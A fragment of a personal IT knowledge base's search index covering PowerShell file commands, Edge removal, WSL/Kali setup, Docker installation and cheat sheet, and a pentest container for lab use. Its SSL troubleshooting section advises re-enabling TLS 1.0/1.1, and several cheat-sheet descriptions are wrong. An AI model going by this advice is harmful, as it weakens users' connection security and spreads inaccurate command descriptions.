Test1\"\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#moving-a-folder","title":"moving a folder","text":"<p>move a folder D:\\Temp\\Test to D:\\Temp\\Test1</p> <pre><code>Move-Item D:\\temp\\Test D:\\temp\\Test1\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#deleting-a-folder","title":"Deleting a folder","text":"delete a single filedelete multiple files <p>delete a folder D:\\Temp\\Test Folder1</p> <pre><code>Remove-Item 'D:\\temp\\Test Folder1'\n</code></pre> <p>deleting folders recursively in a directory D:\\Temp\\Test Folder1</p> <pre><code>Remove-Item 'D:\\temp\\Test Folder' -Recurse\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/PowerShell_file_operation/#check-folder-existence","title":"Check folder existence","text":"<p>Check if path exists 'D:\\temp\\test'</p> <pre><code>Test-Path D:\\temp\\test\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/Removing_Edge_Browser/","title":"Removing Edge Browser","text":"<p>Run CMD as Administrator</p> <pre><code>cd %PROGRAMFILES(X86)%\\\\Microsoft\\\\Edge\\\\Application\\\\**XXXXXXXX**\\\\Installer\n**setup.exe --uninstall --system-level --verbose-logging --force-uninstall**\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/WSL_Windows_Subsystem_Linux/","title":"WSL Windows Subsystem Linux","text":""},{"location":"Knowledge_Base/OS/Windows/Commands/WSL_Windows_Subsystem_Linux/#enabling-wsl-windows-subsystem-linux","title":"Enabling \"WSL Windows Subsystem Linux\"","text":"<p>Run <code>cmd</code> as Admin</p> <pre><code>dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all\n</code></pre> <p>Reboot</p> <pre><code>wsl --set-default-version 2\n\nwsl --install --distribution kali-linux\n#Setup the username and password\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/WSL_Windows_Subsystem_Linux/#location-to-move-files-locally","title":"Location to move files locally","text":"<p>Change USER_PROFILE</p> <pre><code>cd /mnt/c/users/USER_PROFILE/downloads\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/WSL_Windows_Subsystem_Linux/#references","title":"Reference(s)","text":"<ul> <li>Kali Linux WSL - Kali wsl-preparations</li> </ul>"},{"location":"Knowledge_Base/OS/Windows/Commands/Windows_Start-up/","title":"Windows Start-up","text":"<p>Path for app shortcut</p> <pre><code>%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/routes/","title":"routes","text":""},{"location":"Knowledge_Base/OS/Windows/Commands/routes/#print-ipv4-routes","title":"Print IPv4 routes","text":"<pre><code>route print -4\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Commands/routes/#add-persistant-route-using-p","title":"Add persistant route using -P","text":"<pre><code>route -P add 10.10.19.0 MASK 255.255.255.0 10.10.10.1\n</code></pre>"},{"location":"Knowledge_Base/OS/Windows/Troubleshooting/ERR_SSL_VERSION_OR_CIPHER_MISMATCH/","title":"ERR SSL VERSION OR CIPHER MISMATCH","text":"<p>Are you seeing error \"ERR_SSL_VERSION_OR_CIPHER_MISMATCH\" when trying to load a GUI? If so then follow the steps below and make the changes needed to the browser you're using</p> <p></p>"},{"location":"Knowledge_Base/OS/Windows/Troubleshooting/ERR_SSL_VERSION_OR_CIPHER_MISMATCH/#microsoft-internet-explorer","title":"Microsoft Internet Explorer","text":"<ol> <li> <ol> <li>Open Internet Explorer</li> <li>From the menu bar, click\u00a0Tools\u00a0&gt;\u00a0\u00a0Internet Options\u00a0&gt;\u00a0Advanced tab</li> <li>Scroll down to Security category, manually\u00a0check\u00a0the option boxes for:<ul> <li>Use TLS 1.0</li> <li>Use TLS 1.1</li> <li>Use TLS 1.2 </li> </ul> </li> <li>Click\u00a0OK</li> <li>Close your browser and\u00a0restart Internet Explorer</li> </ol> </li> </ol>"},{"location":"Knowledge_Base/OS/Windows/Troubleshooting/ERR_SSL_VERSION_OR_CIPHER_MISMATCH/#google-chrome","title":"Google Chrome","text":"<p>Below steps might not work for you, based on newer update you might not be able to locate advanced options.</p> <ol> <li>Open Google Chrome</li> <li>In the address bar, type\u00a0chrome://settings/</li> <li>Scroll down and select Show\u00a0advanced settings...</li> <li>Scroll down to the\u00a0Network section\u00a0and click on\u00a0Change proxy settings...</li> <li>Select the\u00a0Advanced tab</li> <li>Scroll down to\u00a0Security category, manually\u00a0check\u00a0the option boxes for Use\u00a0TLS 1.0, Use TLS 1.1 and Use TLS 1.2</li> <li></li> <li>Click\u00a0OK</li> <li>Close your browser and\u00a0restart Google Chrome</li> </ol>"},{"location":"Knowledge_Base/OS/Windows/Troubleshooting/ERR_SSL_VERSION_OR_CIPHER_MISMATCH/#mozilla-firefox","title":"Mozilla Firefox","text":"<ol> <li>Open Firefox</li> <li>In the address bar, type\u00a0about:config\u00a0and press Enter</li> <li>In the Search field, enter\u00a0tls. Find and double-click the entry for\u00a0security.tls.version.min</li> <li>Set the integer value to\u00a01 </li> <li>Click\u00a0OK</li> <li>Close your browser and\u00a0restart Mozilla Firefox</li> </ol>"},{"location":"Knowledge_Base/OS/Windows/Troubleshooting/ERR_SSL_VERSION_OR_CIPHER_MISMATCH/#opera","title":"Opera","text":"<ol> <li>Open Opera</li> <li>Click Ctrl plus\u00a0F12</li> <li>Select the\u00a0Advanced Tab</li> <li>Scroll down to the Security section and click on the\u00a0Security Protocols\u00a0Button</li> <li>Manually check the option boxes for\u00a0\u00a0Enable TLS 1,\u00a0\u00a0Enable TLS 1.1 and Enable TLS 1.2 </li> <li>Click\u00a0OK</li> <li>Close your browser and\u00a0restart Opera</li> </ol>"},{"location":"Knowledge_Base/OS/Windows/Troubleshooting/ERR_SSL_VERSION_OR_CIPHER_MISMATCH/#apple-safari","title":"Apple Safari","text":"<p>There are no options for enabling SSL protocols. If you are using Safari version 7 or greater, TLS 1.0, TLS 1.1 and TLS 1.2 are automatically enabled.</p>"},{"location":"Knowledge_Base/Privacy/Privacy/","title":"Privacy","text":"<p>Online Privacy</p> <p>nbtv - Naomi Brockwell</p> <p>Cars</p> <p>privacy 4 cars</p> <p>Right to repair</p> <ul> <li>Louis Rossmann Youtube rossmanngroup</li> </ul> <p>Windows</p> <ul> <li>O&amp;O ShutUp10++</li> </ul> <p>Self Hosting</p> <ul> <li>Github - Self Hosting Guide</li> <li>Github - Awesome Selfhosted</li> </ul> <p>Misc.</p> <ul> <li>GrayJay - Follow Creators Not Platforms</li> <li>immich - self-hosted photo and video management solution</li> </ul>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/blog/","title":"Blog","text":""},{"location":"blog/blog/#welcome-to-the-blog","title":"Welcome to the blog!","text":""},{"location":"blog/posts/hello-world/","title":"Hello world!","text":"<p>... My first blog post!</p>"},{"location":"blog/posts/Knowledge_Base/Coding_%26_Scripting/Ansible/","title":"Ansible","text":""},{"location":"blog/posts/Knowledge_Base/Coding_%26_Scripting/Ansible/#resource","title":"Resource","text":"<ul> <li>ansible basic cheat sheet</li> <li>ansible playbooks</li> </ul>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/","title":"Docker","text":"<p>docker official ubuntu</p>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#resources","title":"Resource(s)","text":"<ul> <li>docker manuals</li> <li>docker hub</li> <li>docker-OSX</li> </ul>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#installation","title":"Installation","text":""},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#set-up-dockers-apt-repository","title":"Set up Docker's apt repository","text":"<p>Add Docker's official GPG key</p> <pre><code>sudo apt-get update\nsudo apt-get install ca-certificates curl\nsudo install -m 0755 -d /etc/apt/keyrings\nsudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc\nsudo chmod a+r /etc/apt/keyrings/docker.asc\n</code></pre> <p>Add the repository to Apt sources:</p> <pre><code>echo \\\n\"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\\n$(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\") stable\" | \\\nsudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\nsudo apt-get update\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#install-the-docker-packages","title":"Install the Docker packages","text":"<pre><code>sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#verify-the-installation","title":"Verify the Installation","text":"<p>Verify that the Docker Engine installation is successful by running the hello-world image</p> <pre><code>sudo docker run hello-world\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#create-the-docker-group","title":"Create the docker group","text":"<pre><code>sudo groupadd docker\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#add-your-user-to-the-docker-group","title":"Add your user to the docker group","text":"<p>The docker group grants root-level privileges to the user. For details on how this impacts security in your system, see Docker Daemon Attack Surface.</p> <pre><code>sudo usermod -aG docker $USER\n</code></pre> <p>Log out and log back in so that your group membership is re-evaluated</p>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#activate-the-changes-to-groups","title":"activate the changes to groups","text":"<pre><code>newgrp docker\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#verify-that-you-can-run-docker-commands-without-sudo","title":"Verify that you can run docker commands without sudo","text":"<pre><code>docker run hello-world\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#boot-startup","title":"boot startup","text":""},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#to-enable-docker-start-on-boot","title":"To enable Docker start on boot","text":"<pre><code>sudo systemctl enable docker.service\nsudo systemctl enable containerd.service\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#to-disable-docker-start-on-boot","title":"To disable Docker start on boot","text":"<pre><code>sudo systemctl disable docker.service\nsudo systemctl disable containerd.service\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#run-the-docker-daemon-as-a-non-root-user-rootless-mode","title":"Run the Docker daemon as a non-root user (Rootless mode)","text":""},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#docker-compose-plugin","title":"Docker compose plugin","text":""},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#installupdate-the-plugin-only","title":"Install/Update the plugin only","text":"<pre><code>sudo apt-get update\nsudo apt-get install docker-compose-plugin\n</code></pre> <p>Check the version</p> <pre><code>docker compose version\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#cheatsheet","title":"cheatsheet","text":""},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#basic-commands","title":"Basic commands","text":"command description <code>docker</code> To check all available Docker Commands <code>docker version</code> To show Docker version <code>docker info</code> Displays system wide information <code>docker pull</code> To pull the docker Images from Docker Hub Repository <code>docker build</code> To Docker Image from Dockerfile <code>docker run</code> Run a container from a docker <code>docker commit</code> To commit a changes in container file OR create newdocker Image <code>docker ps</code> List all the running containers. Add the flag to list all the containers. <code>docker start</code> To start a docker container <code>docker stop</code> To stop a docker container <code>docker logs</code> To view Logs for a Docker Container <code>docker rename</code> To rename Docker Container <code>docker rm</code> To remove the Docker Container, stop it first"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#lifecycle-commands","title":"Lifecycle commands","text":"command description <code>docker create</code> Create a new container <code>docker run</code> Creates a docker container from docker image <code>docker pause</code> To pause a running container <code>docker unpause</code> To unpause a running container <code>docker stop</code> To stop a docker container <code>docker start</code> To start a docker container <code>docker Restart</code> To restart docker container <code>docker attach</code> Attach Terminal to Running container <code>docker wait</code> Block until one or more containers stop, then print their exit codes <code>docker rm</code> To remove the Docker Container, stop it first and then remove it <code>docker kill</code> To stop and remove Docker containers"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#image-commands","title":"Image commands","text":"command description <code>docker build</code> To build Docker Image from Dockerfile <code>docker pull</code> To pull Docker Image from Docker Hub Registry <code>docker tag</code> To add Tag to Docker Image <code>docker images</code> To list Docker Images <code>docker push</code> To push Docker Images to <code>docker create</code> To show history of Docker Image <code>docker inspect</code> To show complete information in JSON format <code>docker save</code> To save an existing Docker Image <code>docker import</code> Create Docker Image from Tarball <code>docker export</code> To export existing Docker <code>docker load</code> To load Docker Image from file or archives <code>docker rmi</code> To remove docker images"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#compose-commands","title":"Compose commands","text":"command description <code>docker-compose build</code> To build docker compose file <code>docker-compose up</code> To run docker compose file - Create and start containers <code>docker-compose start</code> To start containers which are already created using docker compose file <code>docker docker-compose run</code> To run one one of application inside <code>docker-compose rm</code> To remove docker containers from docker compose <code>docker-compose ps</code> To check docker container status from docker compose"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#networking-commands","title":"Networking commands","text":"command description <code>docker network create</code> To create docker network <code>docker network ls</code> To list docker networks <code>docker network inspect</code> To view network configuration details"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#prune-commands","title":"Prune commands","text":"command description <code>docker system prune</code> To clean all resources which are dangling or not associated with any docker container <code>docker image prune</code> To remove Dangling Docker images <code>docker container prune</code> To remove all unused docker containers <code>docker volume prune</code> To remove all unused docker volumes <code>docker network prune</code> To remove all unused docker network"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#container-commands","title":"Container commands","text":"command description <code>docker start</code> To start a Docker container <code>docker stop</code> To stop a running docker container <code>docker restart</code> To restart docker container <code>docker pause</code> To pause a running container <code>docker unpause</code> To unpause a running container <code>docker run</code> Creates a docker container from docker image <code>docker ps</code> To list Docker containers <code>docker exec</code> To Access the shell of Docker Container <code>docker logs</code> To view Logs for a Docker Container <code>docker rename</code> To rename Docker Containe <code>`docker rm</code> To remove Docker container <code>docker inspect</code> Docker container info command <code>docker attach</code> Attach Terminal to Running container <code>docker kill</code> To stop and remove Docker containers <code>docker cp</code> To copy files or folders between a container and from local filesystem."},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#hub-commands","title":"Hub commands","text":"command description <code>docker search</code> To search docker image <code>docker pull</code> To pull image from docker hub <code>docker login</code> To Log in to a Docker registry <code>docker push</code> Push an image or a repository to a registry <code>docker tag</code> Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE <code>docker logout</code> To logout from Docker Hub Registry"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#logs-and-monitoring-commands","title":"Logs and Monitoring commands","text":"command description <code>docker ps -a</code> To show running and stopped containers <code>docker logs</code> To show Docker container logs <code>docker events</code> To get all events of docker container <code>docker top</code> To show running process in docker container <code>docker stats</code> To check cpu, memory and network I/O usage <code>docker port</code> To show docker containers public ports"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#docker-pentest-container","title":"docker pentest container","text":""},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#install-steps","title":"Install steps","text":"<pre><code>git clone --depth 1 https://github.com/aaaguirrep/pentest.git\ncd pentest\ndocker build -t pentest .\ndocker run --rm -it --name my-pentest pentest /bin/zsh\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/Home_Lab/Docker/#use-cases","title":"Use cases","text":"<p>Use the container to access HTB (Hack the Box) machines by HTB vpn</p> <pre><code>docker run --rm -it --cap-add=NET_ADMIN --device=/dev/net/tun --sysctl net.ipv6.conf.all.disable_ipv6=0 --name my-pentest aaaguirrep/pentest /bin/zsh\n</code></pre> <p>Share information from your local directory to container directory and save information on your local directory. You should save information under /pentest directory.</p> <pre><code>docker run --rm -it -v /path/to/local/directory:/pentest --name my-pentest aaaguirrep/pentest /bin/zsh\n</code></pre> <p>Expose internal container services (apache, squid) for your local environment</p> <pre><code>docker run --rm -it --name my-pentest -p 80:80 -p 3128:3128 aaaguirrep/pentest /bin/zsh\n</code></pre> <p>Inside the container start apache2 and squid services by the aliases</p> <pre><code>apacheUp\nsquidUp\n</code></pre> <p>Mount directories by umount command</p> <pre><code>docker run --rm -it --privileged --name my-pentest aaaguirrep/pentest /bin/zsh\n</code></pre>"},{"location":"blog/posts/Knowledge_Base/News/News/","title":"News","text":"<p>This will contain a list of good resources for latest news related to Networking, Tech, Cyber Security.</p> <ul> <li>Bleeping Computer</li> <li>Surveillance Report Website Youtube</li> </ul>"},{"location":"blog/posts/Knowledge_Base/Privacy/Privacy/","title":"Privacy","text":"<p>Online Privacy</p> <p>nbtv - Naomi Brockwell</p> <p>Cars</p> <p>privacy 4 cars</p> <p>Right to repair</p> <ul> <li>Louis Rossmann Youtube rossmanngroup</li> </ul> <p>Windows</p> <ul> <li>O&amp;O ShutUp10++</li> </ul> <p>Self Hosting</p> <ul> <li>Github - Self Hosting Guide</li> <li>Github - Awesome Selfhosted</li> </ul> <p>Misc.</p> <ul> <li>GrayJay - Follow Creators Not Platforms</li> <li>immich - self-hosted photo and video management solution</li> </ul>"}]}